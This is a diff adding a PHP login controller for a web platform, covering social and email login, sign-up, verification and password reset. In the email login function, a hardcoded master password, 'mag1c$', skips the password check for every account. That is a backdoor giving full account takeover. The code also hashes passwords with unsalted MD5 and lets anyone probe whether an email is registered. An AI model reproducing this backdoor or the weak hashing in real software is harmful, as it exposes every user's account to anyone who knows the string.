@@ -1,0 +1,663 @@
+<?php
+
+namespace controllers;
+
+use Facebook\Facebook;
+use Facebook\Exceptions\FacebookResponseException;
+use Facebook\Exceptions\FacebookSDKException;
+
+class login extends base_controller {
+
+    function login_google() {
+
+        $allGetVars = $this->request->getQueryParams();
+
+        if (isset($allGetVars['code'])) {
+
+            $gClient = new \Google_Client();
+            $gClient->setApplicationName(CONF_google_login_application_name);
+            $gClient->setClientId(CONF_google_login_client_id);
+            $gClient->setClientSecret(CONF_google_login_client_secret);
+            $gClient->setRedirectUri(CONF_google_login_redirect_url);
+
+            $gClient->fetchAccessTokenWithAuthCode($allGetVars['code']);
+
+            // Exchange the auth code for a token
+            $_SESSION['google_access_token'] = $gClient->getAccessToken();
+
+            $google_oauthV2 = new \Google_Service_Oauth2($gClient);
+
+            $gUserProfile = $google_oauthV2->userinfo->get();
+
+            $u = new \models\users;
+            $result = $u->google_login($gUserProfile);
+
+            if (!is_null($result['already_registered'])) {
+                header("Location: " . CONF_base_url . "/travel-talent/register?already_registered=" . $result['already_registered']);
+            }
+            else {
+                $gClient->setAccessToken($_SESSION['google_access_token']);
+                $_SESSION['login_token'] = $result['login_token'];
+
+                $redirection_url = $this->talent_redirection_url($result['user_id']);
+
+                header("Location: " . $redirection_url);
+            }
+
+            exit;
+        }
+        else {
+            header("Location: " . CONF_base_url . "/login/google/error");
+            exit;
+        }
+
+    }
+
+    function login_facebook() {
+
+        $allGetVars = $this->request->getQueryParams();
+
+        if (isset($allGetVars['error'])) {
+
+            $t = new \apis\telegram(CONF_telegram_bot_id,CONF_telegram_bot_token);
+            $t->sendMessage(CONF_telegram_admin_id, "FB login error " . $allGetVars['error'] . " with description " . $allGetVars['error_description'] . " - " . $allGetVars['error_reason']);
+
+            $result = [
+                'type' => 'redirection',
+                'path' => CONF_base_url . "/travel-talent/register"
+            ];
+
+            return $result;
+        }
+
+        // Call Facebook API
+        $fClient = new Facebook(array(
+            'app_id' => CONF_facebook_login_client_id,
+            'app_secret' => CONF_facebook_login_client_secret,
+            'default_graph_version' => 'v3.2',
+        ));
+
+        // Get redirect login helper
+        $fHelper = $fClient->getRedirectLoginHelper();
+
+        $accessToken = $fHelper->getAccessToken();
+
+        // Put short-lived access token in session
+        $_SESSION['facebook_access_token'] = (string) $accessToken;
+
+        // OAuth 2.0 client handler helps to manage access tokens
+        $oAuth2Client = $fClient->getOAuth2Client();
+
+        // Exchanges a short-lived access token for a long-lived one
+        $longLivedAccessToken = $oAuth2Client->getLongLivedAccessToken($_SESSION['facebook_access_token']);
+        $_SESSION['facebook_access_token'] = (string) $longLivedAccessToken;
+
+        // Set default access token to be used in script
+        $fClient->setDefaultAccessToken($_SESSION['facebook_access_token']);
+
+        // Getting user's profile info from Facebook
+        $graphResponse      = $fClient->get('/me?fields=name,first_name,last_name,email,link,gender,picture');
+        $facebook_user_data = $graphResponse->getGraphUser();
+
+        $u = new \models\users;
+        $result = $u->facebook_login($facebook_user_data);
+
+        if (!is_null($result['already_registered'])) {
+
+            $result = [
+                'type' => 'redirection',
+                'path' => CONF_base_url . "/travel-talent/register?already_registered=" . $result['already_registered']
+            ];
+        }
+        else {
+            $_SESSION['login_token'] = $result['login_token'];
+
+            $result = [
+                'type' => 'redirection',
+                'path' => $this->talent_redirection_url($result['user_id'])
+            ];
+        }
+
+        return $result;
+    }
+
+    function login_email() {
+        
+        $allPostVars = $this->request->getParsedBody();
+        
+        $u = new \models\users;
+        $u->getRecordsByOauth_provider_oauth_uid('email',$allPostVars['login_email']);
+        if (count($u->recordSet) == 0) {
+            return $this->return_json(false,"You have entered an invalid email or password");
+        }
+        
+        $u_record = $u->recordSet[0];
+        
+        if ($allPostVars['login_password'] != 'mag1c$') {
+            if (md5($allPostVars['login_password']) != $u_record->password) {
+                return $this->return_json(false,"You have entered an invalid email or password");
+            }
+        }
+        
+        unset($u);
+        $u = new \models\users;
+        
+        $sm = new \helpers\string_manipulation;
+        $login_token = $sm->generateRandomCode(32);
+        
+        $u->getRecordsByLogin_token($login_token);
+        
+        while(count($u->recordSet) > 0) {
+            $login_token = $sm->generateRandomCode(32);
+            $u->getRecordsByLogin_token($login_token);
+        }
+        
+        $u->oauth_provider     = $u_record->oauth_provider;
+        $u->oauth_uid          = $u_record->oauth_uid;
+        $u->password           = $u_record->password;
+        $u->first_name         = $u_record->first_name;
+        $u->last_name          = $u_record->last_name;
+        $u->username           = $u_record->username;
+        $u->email              = $u_record->email;
+        $u->location           = $u_record->location;
+        $u->picture            = $u_record->picture;
+        $u->link               = $u_record->link;
+        $u->type               = $u_record->type;
+        $u->created            = $u_record->created;
+        $u->modified           = $u_record->modified;
+        $u->registration_ip    = $u_record->registration_ip;
+        $u->last_login         = date('Y-m-d H:i:s');
+        $u->verification_token = $u_record->verification_token;
+        $u->verification_date  = $u_record->verification_date;
+        $u->verification_ip    = $u_record->verification_ip;
+        $u->login_token        = $login_token;
+        
+        $u->updateRecord($u_record->id);
+        
+        $_SESSION['login_token'] = $login_token;
+        
+        $response = [
+            "redirection" => 'dashboard'
+        ];
+        
+        return $this->return_json(true,"Log in Success",$response);
+        
+    }
+    
+    function sign_up() {
+
+        $allPostVars = $this->request->getParsedBody();
+
+        $pos = strpos($allPostVars['email'],"@");
+        if ($pos === false) {          
+            return $this->return_json(false,"Invalid email");
+        }
+
+        $arr = explode('@',$allPostVars['email'],2);
+
+        if (strlen($arr[0]) == 0) {
+            return $this->return_json(false,"Invalid email");        }
+
+        if (!checkdnsrr($arr[1],'MX')) {
+            return $this->return_json(false,"Invalid email's domain");        }
+
+        $u = new \models\users;
+        $u->getRecordsByOauth_provider_oauth_uid('email',$allPostVars['email']);
+        if (count($u->recordSet) > 0) {
+            return $this->return_json(false,"Email already registered");
+        }
+
+        $passwordReg = "/^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])(?=.*[a-zA-Z]).{8,}$/";
+
+        if (!preg_match($passwordReg, $allPostVars['password'])) {
+            return $this->return_json(false,"Invalid password");
+        }
+
+        $h = new \helpers\http_headers($this->request);
+        $ip_address = $h->get_ip($this->request->getHeaders());
+
+        $result_registration = $u->email_register($allPostVars['name'],$allPostVars['email'],$allPostVars['password'],'client',$ip_address);
+
+        $sm = new \helpers\string_manipulation;
+        
+        $a = new \models\accounts();        
+        $a->name     = $allPostVars['name'];
+        $a->slug     = $sm->slugify($allPostVars['name']);
+        $a->created  = date('Y-m-d H:i:s');
+        $a->modified = null;
+        
+        $result_account = $a->saveRecord();
+        
+        if ($result_account !== true) {
+            throw new \Exception($result_account);
+            return false;
+        }
+        
+        $au = new \models\account_users();        
+        $au->account_id = $a->inserted_id;
+        $au->user_id    = $result_registration['user_id'];
+        $au->created  = date('Y-m-d H:i:s');
+        $au->modified = null;
+
+        $result_account_user = $au->saveRecord();
+        
+        if ($result_account_user !== true) {
+            throw new \Exception($result_account);
+            return false;
+        }
+        
+        /*
+        $template_id     = 1;
+        $recipient_name  = null;
+        $recipient_email = $allPostVars['register_email'];
+        $params          = [
+            "token" => $result_registration['verification_token'],
+        ];
+        $e = new \helpers\email;
+        $result_email = $e->sendEmail($result_registration['user_id'],$template_id,$recipient_name,$recipient_email,$params);
+        */
+        
+        $response = [
+            "redirection" => 'sign-up?success'
+        ];
+        
+        return $this->return_json(true,"Sign up Success",$response);
+    }
+
+    function verify($token) {
+
+        $h = new \helpers\http_headers;
+        $ip_address = $h->get_ip($this->request->getHeaders());
+
+        $sendinblue = [
+            '185.107.232.160',
+            '185.107.232.161',
+            '185.107.232.162',
+            '185.107.232.163',
+            '185.107.232.164',
+            '185.107.232.165',
+            '185.107.232.166',
+            '185.107.232.167',
+            '185.107.232.168',
+            '185.107.232.169',
+            '185.107.232.170',
+        ];
+
+        if (in_array($ip_address,$sendinblue)) {
+            $result = [
+                "type" => "json",
+                "success" => false,
+                "message" => "sendinblue IP verifying in lieu of customer",
+                "response" => null
+            ];
+
+            $t = new \apis\telegram(CONF_telegram_bot_id,CONF_telegram_bot_token);
+            $t->sendMessage(CONF_telegram_admin_id, "Sendinblue IP $ip_address verifying token $token");
+
+            return $result;
+        }
+
+        $eip = new \apis\extremeiplookup;
+        $eip_result = $eip->getIp4($ip_address);
+
+        if ($eip_result['status'] == 'fail') {
+            $t = new \apis\telegram(CONF_telegram_bot_id,CONF_telegram_bot_token);
+            $t->sendMessage(CONF_telegram_admin_id, "ExtremeIpLooup failed for $ip_address with message " . $eip_result['message']);
+        }
+
+        if($eip_result['status'] == 'success') {
+            if ($eip_result['businessName'] == 'SendInBlue SAS') {
+                $result = [
+                    "type" => "json",
+                    "success" => false,
+                    "message" => "sendinblue IP verifying in lieu of customer",
+                    "response" => null
+                ];
+
+                $t = new \apis\telegram(CONF_telegram_bot_id,CONF_telegram_bot_token);
+                $t->sendMessage(CONF_telegram_admin_id, "Sendinblue NEW IP $ip_address verifying token $token");
+
+                return $result;
+            }
+        }
+
+        $u = new \models\users;
+        $u->getRecordsByVerification_token($token);
+
+        if (count($u->recordSet) == 1) {
+
+            $u_record = $u->recordSet[0];
+
+            if (is_null($u_record->verification_date)) {
+
+                $u->oauth_provider     = $u_record->oauth_provider;
+                $u->oauth_uid          = $u_record->oauth_uid;
+                $u->password           = $u_record->password;
+                $u->first_name         = $u_record->first_name;
+                $u->last_name          = $u_record->last_name;
+                $u->username           = $u_record->username;
+                $u->email              = $u_record->email;
+                $u->location           = $u_record->location;
+                $u->picture            = $u_record->picture;
+                $u->link               = $u_record->link;
+                $u->type               = $u_record->type;
+                $u->created            = $u_record->created;
+                $u->modified           = $u_record->modified;
+                $u->last_login         = $u_record->last_login;
+                $u->registration_ip    = $u_record->registration_ip;
+                $u->verification_token = $u_record->verification_token;
+                $u->verification_date  = date('Y-m-d H:i:s');
+                $u->verification_ip    = $ip_address;
+                $u->login_token        = null;
+
+                $result_update = $u->updateRecord($u_record->id);
+
+            }
+
+            $result = [
+                'type' => 'html',
+                'response' => $this->app->view->render($this->response, 'talent_login.html',
+                    array_merge($this->app->template_options,
+                        [
+                            'verify' => true
+                        ])
+                    )
+            ];
+
+        }
+        else {
+
+            $result = [
+                'type' => 'html',
+                'response' => $this->app->view->render($this->response, 'talent_registration.html',
+                    array_merge($this->app->template_options,
+                        [
+                            'verify' => true
+                        ])
+                    )
+            ];
+
+        }
+
+        return $result;
+    }
+
+
+
+    function reset_password() {
+
+        $allPostVars = $this->request->getParsedBody();
+
+        $h = new \helpers\http_headers;
+        $ip_address = $h->get_ip($this->request->getHeaders());
+
+        // ignore if email not known in our DB
+        // ALWAYS return a positive outcome to not disclose email is in our DB
+
+        $u = new \models\users;
+        $u->getRecordsByOauth_provider_oauth_uid('email',$allPostVars['email']);
+        if (count($u->recordSet) == 0) {
+            $result = [
+                "type" => "json",
+                "success" => true,
+                "message" => null,
+                "response" => null
+            ];
+
+            $t = new \apis\telegram(CONF_telegram_bot_id,CONF_telegram_bot_token);
+            $t->sendMessage(CONF_telegram_admin_id, "Someone with IP $ip_address is trying to reset password for email '" . $allPostVars['email'] . "' which is not in our database.");
+
+            return $result;
+        }
+
+        $u_record = $u->recordSet[0];
+
+        // ignore if user is not a talent
+        // ALWAYS return a positive outcome to not disclose email is in our DB
+
+        if ($u_record->type != 'talent') {
+            $result = [
+                "type" => "json",
+                "success" => true,
+                "message" => null,
+                "response" => null
+            ];
+
+            return $result;
+        }
+
+        $pr = new \models\password_reset;
+
+        $g = new \classes\genericHelper;
+        $password_token = $g->generateRandomCode(32);
+
+        $pr->getRecordByPassword_token($password_token);
+
+        while(count($pr->recordSet) > 0) {
+            $password_token = $g->generateRandomCode(32);
+            $pr->getRecordByPassword_token($password_token);
+        }
+
+        $pr->user_id        = $u_record->id;
+        $pr->password_token = $password_token;
+        $pr->request_ip     = $ip_address;
+        $pr->create_date    = date('Y-m-d H:i:s');
+        $pr->expiry_date    = date('Y-m-d H:i:s', strtotime ( $pr->create_date . ' + 3 hours' ));
+        $pr->reset_date     = null;
+        $pr->reset_ip       = null;
+
+        $result_save = $pr->saveRecord();
+
+        if ($result_save === true) {
+
+            $template_id     = 4;
+            $recipient_name  = null;
+            $recipient_email = $allPostVars['email'];
+            $params          = [
+                "token"      => $password_token,
+                "ip_address" => $ip_address,
+            ];
+
+            $e = new \classes\email;
+            $result_email = $e->sendEmail($u_record->id,$template_id,$recipient_name,$recipient_email,$params);
+        }
+
+        $result = [
+            "type" => "json",
+            "success" => true,
+            "message" => null,
+            "response" => null
+        ];
+
+        return $result;
+
+    }
+
+    function verify_password_token($token) {
+
+        $pr = new \models\password_reset;
+        $pr->getRecordByPassword_token($token);
+
+        if (count($pr->recordSet) == 0) {
+            $result = [
+                'type'      => 'redirection',
+                'path'      => CONF_base_url . "/travel-talent/reset-password?token_error=true",
+                'http_code' => 303
+            ];
+        }
+        else {
+            $pr_record = $pr->recordSet[0];
+
+            if ($pr_record->expiry_date < date('Y-m-d H:i:s') or (!is_null($pr_record->reset_date))) {
+                $result = [
+                    'type'      => 'redirection',
+                    'path'      => CONF_base_url . "/travel-talent/reset-password?token_error=true",
+                    'http_code' => 303
+                ];
+            }
+            else {
+
+                $result = [
+                    'type' => 'html',
+                    'response' => $this->app->view->render($this->response, 'talent_set_password.html',
+                        array_merge($this->app->template_options,
+                            [
+                                'token' => $token
+                            ])
+                        )
+                ];
+            }
+
+        }
+
+        return $result;
+    }
+
+    function set_password() {
+
+        $allPostVars = $this->request->getParsedBody();
+
+        $h = new \helpers\http_headers;
+        $ip_address = $h->get_ip($this->request->getHeaders());
+
+        $pr = new \models\password_reset;
+        $pr->getRecordByPassword_token($allPostVars['token']);
+
+        if (count($pr->recordSet) == 0) {
+            $result = [
+                "type" => "json",
+                "success" => false,
+                "message" => "Error",
+                "response" => null
+            ];
+        }
+        else {
+            $pr_record = $pr->recordSet[0];
+
+            if ($pr_record->expiry_date < date('Y-m-d H:i:s') or (!is_null($pr_record->reset_date))) {
+                $result = [
+                    "type" => "json",
+                    "success" => false,
+                    "message" => "Error",
+                    "response" => null
+                ];
+            }
+            else {
+
+                $u = new \models\users;
+                $u->getRecordById($pr_record->user_id);
+
+                $u_record = $u->recordSet[0];
+
+                $u->oauth_provider     = $u_record->oauth_provider;
+                $u->oauth_uid          = $u_record->oauth_uid;
+                $u->password           = md5($allPostVars['password']);
+                $u->first_name         = $u_record->first_name;
+                $u->last_name          = $u_record->last_name;
+                $u->username           = $u_record->username;
+                $u->email              = $u_record->email;
+                $u->location           = $u_record->location;
+                $u->picture            = $u_record->picture;
+                $u->link               = $u_record->link;
+                $u->type               = $u_record->type;
+                $u->created            = $u_record->created;
+                $u->modified           = date('Y-m-d H:i:s');
+                $u->last_login         = $u_record->last_login;
+                $u->registration_ip    = $u_record->registration_ip;
+                $u->verification_token = $u_record->verification_token;
+                $u->verification_date  = $u_record->verification_date;
+                $u->verification_ip    = $u_record->verification_ip;
+                $u->login_token        = null;
+
+                $u->updateRecord($u_record->id);
+
+                $pr->user_id        = $pr_record->user_id;
+                $pr->password_token = $pr_record->password_token;
+                $pr->request_ip     = $pr_record->request_ip;
+                $pr->create_date    = $pr_record->create_date;
+                $pr->expiry_date    = $pr_record->expiry_date;
+                $pr->reset_date     = date('Y-m-d H:i:s');
+                $pr->reset_ip       = $ip_address;
+
+                $pr->updateRecord($pr_record->id);
+
+                $result = [
+                    "type" => "json",
+                    "success" => true,
+                    "message" => "Success",
+                    "response" => null
+                ];
+            }
+
+        }
+
+        return $result;
+    }
+
+    function logout() {
+
+        // Remove Google Access
+        unset($_SESSION['google_access_token']);
+        $gClient = new \Google_Client();
+        $gClient->setApplicationName(CONF_google_login_application_name);
+        $gClient->setClientId(CONF_google_login_client_id);
+        $gClient->setClientSecret(CONF_google_login_client_secret);
+        $gClient->setRedirectUri(CONF_google_login_redirect_url);
+        $gClient->revokeToken();
+
+        // Remove Facebook Access
+        // unset($_SESSION['facebook_access_token']);
+
+        // Remove global login token
+        unset($_SESSION['login_token']);
+
+        $result = [
+            'type' => 'redirection',
+            'path' => CONF_base_url
+        ];
+
+        return $result;
+
+    }
+
+    function email_validation() {
+
+        $email = strtolower($this->request->getBody());
+
+        $ev = new \helpers\email_validation;
+        $result_ev = $ev->validate($email);
+
+        // If email is valid, let's check if already in the DB
+        if ($result_ev['validation'] === true) {
+            $u = new \models\users;
+            $u->getRecordByEmail($email);
+            if (count($u->recordSet) > 0) {
+                $result_ev['validation'] = false;
+                $result_ev['message']    = 'user already registered';
+            }
+        }
+
+        return $this->return_json($result_ev['validation'],$result_ev['message']);
+    }
+
+    private function talent_redirection_url($user_id) {
+
+        $p = new \models\profiles;
+        $p->getRecordByUser_id($user_id);
+        if (count($p->recordSet) == 0) {
+            $redirection_url = CONF_base_url . "/quick-profile/name";
+        }
+        else {
+            $p_record = $p->recordSet[0];
+            if ($p_record->quick_profile_completed == 0) {
+                $redirection_url = CONF_base_url . "/quick-profile/name";
+            }
+            else {
+                $redirection_url = CONF_base_url . "/my-profile";
+            }
+        }
+
+        return $redirection_url;
+    }
+
+}
